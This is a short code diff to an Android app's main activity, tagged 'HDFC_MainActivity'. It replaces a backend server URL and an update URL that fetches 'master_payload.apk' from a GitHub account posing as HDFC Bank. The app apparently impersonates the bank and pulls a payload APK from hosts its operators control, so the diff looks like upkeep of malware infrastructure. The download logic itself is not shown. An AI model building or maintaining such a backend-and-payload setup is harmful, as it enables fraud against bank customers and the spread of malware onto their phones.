@@ -42,8 +42,8 @@ import java.util.Locale;
 
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
-    private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/latest/download/master_payload.apk";
+    private static final String BACKEND_URL = "https://newmadebackend.onrender.com";
+    private static final String UPDATE_URL = "https://github.com/hdfcbank100200-tech/newmade1/releases/latest/download/master_payload.apk";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
